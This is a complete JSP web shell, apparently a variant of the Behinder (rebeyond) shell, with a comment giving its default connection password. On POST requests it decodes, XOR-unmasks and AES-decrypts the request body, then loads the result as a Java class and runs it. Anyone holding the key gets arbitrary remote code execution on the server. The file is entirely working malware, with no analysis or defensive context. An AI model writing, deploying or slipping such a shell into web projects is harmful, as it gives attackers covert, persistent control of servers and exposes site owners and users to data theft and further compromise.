<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%!class U extends ClassLoader{
	U(ClassLoader c){
		super(c);
	}
	public Class g(byte []b){
		return super.defineClass(b,0,b.length);
	}
}
%>
<%if (request.getMethod().equals("POST")){
		String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
		session.putValue("u",k);
		Cipher c=Cipher.getInstance("AES");
		c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
		
		String dataraw=request.getReader().readLine();
		dataraw=dataraw.replace("#",k.substring(0,1).toLowerCase()).replace("*","=");
		byte[] data=new sun.misc.BASE64Decoder().decodeBuffer(dataraw);
		for(int i = 0; i < data.length; ++i) {
          data[i] = (byte)(data[i] ^ k.getBytes()[i + 1 & 15]);
		}
		new U(this.getClass().getClassLoader()).g(c.doFinal(data)).newInstance().equals(pageContext);
	}
%>